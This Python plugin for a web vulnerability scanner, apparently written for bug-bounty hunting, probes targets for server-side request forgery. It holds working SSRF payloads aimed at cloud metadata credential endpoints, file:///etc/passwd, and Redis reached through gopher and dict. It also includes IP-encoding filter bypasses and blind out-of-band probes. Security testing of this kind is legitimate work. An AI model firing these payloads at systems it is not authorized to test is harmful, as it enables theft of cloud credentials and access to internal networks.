"""
Professional-Grade Server-Side Request Forgery (SSRF) Plugin
Detects SSRF vulnerabilities including cloud metadata access

Supports:
- AWS/Azure/GCP cloud metadata endpoints
- Internal network access (localhost, private IPs)
- Protocol handler abuse (file://, gopher://, dict://)
- IP encoding bypasses (decimal, hex, octal)
- DNS-based OAST detection
- Port scanning indicators
- URL redirect chains
"""

import asyncio
import re
import uuid
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
from scanner.plugins.base import BasePlugin
from scanner.logger import get_logger

LOG = get_logger("vuln-scanner")


class SSRFPayloads:
    """Comprehensive SSRF payload library"""

    # Cloud metadata endpoints (critical for Coinbase-level targets)
    CLOUD_METADATA = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata/computeMetadata/v1/",
        ],
        "digitalocean": [
            "http://169.254.169.254/metadata/v1.json",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
        ]
    }

    # Internal network targets
    INTERNAL_TARGETS = [
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",  # IPv6 localhost
        "http://127.1",  # Short form
        "http://0",      # Decimal 0
    ]

    # Protocol handlers (often bypass filters)
    PROTOCOL_HANDLERS = [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:6379/_INFO",  # Redis
        "dict://127.0.0.1:6379/INFO",     # Dict protocol
        "ldap://127.0.0.1:389/%0astats",
        "tftp://127.0.0.1:69/file",
    ]

    # IP encoding bypasses
    @staticmethod
    def encode_ip(ip: str) -> List[str]:
        """Generate IP encoding variations for bypass"""
        encodings = [ip]  # Original

        # Parse IP (assume IPv4 for encoding)
        if ip.count('.') == 3:
            parts = ip.split('.')
            try:
                octets = [int(p) for p in parts]

                # Decimal encoding (e.g., 127.0.0.1 -> 2130706433)
                decimal = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
                encodings.append(f"http://{decimal}")

                # Hex encoding (e.g., 127.0.0.1 -> 0x7f.0x0.0x0.0x1)
                hex_ip = ".".join([f"0x{oct:x}" for oct in octets])
                encodings.append(f"http://{hex_ip}")

                # Octal encoding (e.g., 127.0.0.1 -> 0177.0.0.01)
                octal_ip = ".".join([f"0{oct:o}" for oct in octets])
                encodings.append(f"http://{octal_ip}")

                # Mixed encoding
                encodings.append(f"http://0x7f.0.0.1")  # Partial hex
                encodings.append(f"http://127.1")       # Short form

            except ValueError:
                pass

        return encodings

    # Common SSRF parameter names
    SSRF_PARAMS = [
        "url", "uri", "path", "redirect", "redirect_url", "redirect_uri",
        "callback", "callback_url", "return_url", "return_to", "next",
        "continue", "dest", "destination", "target", "rurl", "load",
        "file", "document", "folder", "feed", "host", "port", "to",
        "out", "view", "dir", "download", "pdf", "fetch", "show"
    ]

    # Response indicators for cloud metadata
    CLOUD_INDICATORS = {
        "aws": ["ami-id", "instance-id", "security-credentials", "iam", "AWS"],
        "azure": ["compute", "vmId", "subscriptionId", "resourceGroupName"],
        "gcp": ["project", "instance", "serviceAccounts", "attributes"],
    }


class Plugin(BasePlugin):
    name = "ssrf"
    description = "Detects Server-Side Request Forgery vulnerabilities"

    def __init__(self):
        super().__init__()
        self.payloads = SSRFPayloads()

    async def _test_cloud_metadata_ssrf(self, url: str, param: str, requester):
        """Test for cloud metadata SSRF (AWS, Azure, GCP)"""
        vulnerabilities = []

        for cloud_provider, endpoints in self.payloads.CLOUD_METADATA.items():
            for endpoint in endpoints[:2]:  # Test top 2 per provider
                test_params = {param: endpoint}

                try:
                    response = await requester.get(url, params=test_params)

                    if not response or not isinstance(response, dict):
                        continue

                    content = response.get("text", "").lower()

                    # Check for cloud-specific indicators
                    indicators = self.payloads.CLOUD_INDICATORS.get(cloud_provider, [])
                    for indicator in indicators:
                        if indicator.lower() in content:
                            vulnerabilities.append({
                                "type": "ssrf_cloud_metadata",
                                "cloud_provider": cloud_provider,
                                "endpoint": endpoint,
                                "param": param,
                                "indicator": indicator,
                                "message": f"SSRF to {cloud_provider.upper()} metadata endpoint detected",
                                "severity": "critical",
                                "confidence": "firm",
                                "impact": f"Access to {cloud_provider.upper()} instance metadata - can leak IAM credentials",
                                "bounty_potential": "$10,000 - $100,000+",
                            })
                            return vulnerabilities  # Stop on first confirmed

                except Exception as e:
                    LOG.debug(f"Cloud metadata test failed: {e}")

        return vulnerabilities

    async def _test_internal_network_ssrf(self, url: str, param: str, requester):
        """Test for internal network SSRF"""
        vulnerabilities = []

        # Test localhost variations
        for target in self.payloads.INTERNAL_TARGETS[:5]:  # Test top 5
            test_params = {param: target}

            try:
                response = await requester.get(url, params=test_params, timeout=5)

                if not response or not isinstance(response, dict):
                    continue

                content = response.get("text", "")
                status = response.get("status", 0)

                # Check for internal service indicators
                internal_indicators = [
                    "apache", "nginx", "iis", "tomcat", "jetty",
                    "localhost", "127.0.0.1", "internal", "private",
                    "unauthorized", "forbidden", "access denied"
                ]

                if any(indicator in content.lower() for indicator in internal_indicators):
                    vulnerabilities.append({
                        "type": "ssrf_internal_network",
                        "target": target,
                        "param": param,
                        "status": status,
                        "message": "SSRF to internal network detected",
                        "severity": "high",
                        "confidence": "firm",
                        "impact": "Access to internal services, potential for port scanning and service enumeration",
                        "bounty_potential": "$5,000 - $50,000",
                    })
                    return vulnerabilities  # Stop on first confirmed

            except asyncio.TimeoutError:
                # Timeout might indicate blocked but worth noting
                pass
            except Exception as e:
                LOG.debug(f"Internal network test failed: {e}")

        return vulnerabilities

    async def _test_protocol_handler_ssrf(self, url: str, param: str, requester):
        """Test for protocol handler SSRF (file://, gopher://, etc.)"""
        vulnerabilities = []

        for payload in self.payloads.PROTOCOL_HANDLERS[:3]:  # Test top 3
            test_params = {param: payload}

            try:
                response = await requester.get(url, params=test_params)

                if not response or not isinstance(response, dict):
                    continue

                content = response.get("text", "")

                # Check for file:// indicators
                if "file://" in payload:
                    file_indicators = ["root:", "[extensions]", "bin/bash", "windows"]
                    if any(indicator in content.lower() for indicator in file_indicators):
                        vulnerabilities.append({
                            "type": "ssrf_file_protocol",
                            "payload": payload,
                            "param": param,
                            "message": "SSRF with file:// protocol access detected",
                            "severity": "critical",
                            "confidence": "firm",
                            "impact": "Local file disclosure via SSRF",
                            "bounty_potential": "$5,000 - $50,000",
                        })
                        return vulnerabilities

                # Check for gopher:// or dict:// indicators
                if any(proto in payload for proto in ["gopher://", "dict://"]):
                    service_indicators = ["redis", "info", "server", "version"]
                    if any(indicator in content.lower() for indicator in service_indicators):
                        vulnerabilities.append({
                            "type": "ssrf_protocol_handler",
                            "payload": payload,
                            "param": param,
                            "message": "SSRF with alternate protocol handler detected",
                            "severity": "high",
                            "confidence": "firm",
                            "impact": "Interaction with internal services (Redis, etc.)",
                            "bounty_potential": "$5,000 - $30,000",
                        })
                        return vulnerabilities

            except Exception as e:
                LOG.debug(f"Protocol handler test failed: {e}")

        return vulnerabilities

    async def _test_ip_encoding_bypass(self, url: str, param: str, requester):
        """Test IP encoding bypass techniques"""
        vulnerabilities = []

        # Test encoding bypass on 127.0.0.1
        encodings = self.payloads.encode_ip("127.0.0.1")

        for encoded in encodings[:5]:  # Test top 5 encodings
            test_params = {param: encoded}

            try:
                response = await requester.get(url, params=test_params)

                if not response or not isinstance(response, dict):
                    continue

                content = response.get("text", "")

                # Check for localhost indicators
                localhost_indicators = ["apache", "nginx", "localhost", "127.0.0.1"]
                if any(indicator in content.lower() for indicator in localhost_indicators):
                    vulnerabilities.append({
                        "type": "ssrf_encoding_bypass",
                        "payload": encoded,
                        "param": param,
                        "message": "SSRF via IP encoding bypass detected",
                        "severity": "high",
                        "confidence": "firm",
                        "impact": "WAF/filter bypass via IP encoding",
                        "bounty_potential": "$3,000 - $25,000",
                    })
                    return vulnerabilities

            except Exception as e:
                LOG.debug(f"IP encoding test failed: {e}")

        return vulnerabilities

    async def _test_oast_ssrf(self, url: str, param: str, requester, oast_server: str):
        """Test OAST-based blind SSRF"""
        vulnerabilities = []

        if not oast_server:
            return vulnerabilities

        # Generate unique identifier
        unique_id = str(uuid.uuid4())

        # Test with different protocols
        oast_payloads = [
            f"http://{oast_server}/{unique_id}",
            f"https://{oast_server}/{unique_id}",
            f"http://{unique_id}.{oast_server}",
        ]

        for payload in oast_payloads[:2]:  # Test top 2
            test_params = {param: payload}

            try:
                await requester.get(url, params=test_params)

                vulnerabilities.append({
                    "type": "ssrf_oast",
                    "payload": payload,
                    "param": param,
                    "unique_id": unique_id,
                    "message": f"OAST SSRF probe sent - Check your server for request with ID: {unique_id}",
                    "severity": "high",
                    "confidence": "tentative",
                    "impact": "Blind SSRF - requires OAST confirmation",
                    "bounty_potential": "$5,000 - $50,000",
                })

            except Exception as e:
                LOG.debug(f"OAST test failed: {e}")

        return vulnerabilities

    async def _find_ssrf_parameters(self, target: str, requester):
        """Find potential SSRF parameters in target"""
        params = []

        # Check URL parameters
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)

        for param_name in query_params.keys():
            if any(ssrf_param in param_name.lower() for ssrf_param in self.payloads.SSRF_PARAMS):
                params.append(("url", param_name))

        # Check forms
        try:
            response = await requester.get(target)
            if response and isinstance(response, dict):
                soup = BeautifulSoup(response.get("text", ""), "html.parser")
                forms = soup.find_all("form")

                for form in forms:
                    inputs = form.find_all(["input", "textarea"])
                    for inp in inputs:
                        name = inp.get("name")
                        if name and any(ssrf_param in name.lower() for ssrf_param in self.payloads.SSRF_PARAMS):
                            params.append(("form", name))
        except Exception:
            pass

        return params

    async def run(self, target: str, requester, oast_server: str = None):
        """Main entry point for SSRF scanning"""

        if not target.startswith("http"):
            return []

        vulnerabilities = []

        # Find potential SSRF parameters
        params = await self._find_ssrf_parameters(target, requester)

        if not params:
            # Passive detection - no parameters found
            return [{
                "type": "ssrf_passive",
                "message": "No obvious SSRF parameters detected",
                "severity": "info",
                "confidence": "tentative",
            }]

        # Test each parameter
        for param_type, param_name in params[:5]:  # Test top 5 params
            LOG.info(f"Testing SSRF parameter: {param_name}")

            # 1. Cloud metadata SSRF (highest priority for Coinbase-level targets)
            result = await self._test_cloud_metadata_ssrf(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)
                continue  # Stop testing this param if confirmed vuln

            # 2. Internal network SSRF
            result = await self._test_internal_network_ssrf(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)
                continue

            # 3. Protocol handler SSRF
            result = await self._test_protocol_handler_ssrf(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)
                continue

            # 4. IP encoding bypass
            result = await self._test_ip_encoding_bypass(target, param_name, requester)
            if result:
                vulnerabilities.extend(result)
                continue

            # 5. OAST-based blind SSRF (always test, doesn't confirm immediately)
            if oast_server:
                result = await self._test_oast_ssrf(target, param_name, requester, oast_server)
                if result:
                    vulnerabilities.extend(result)

        return vulnerabilities
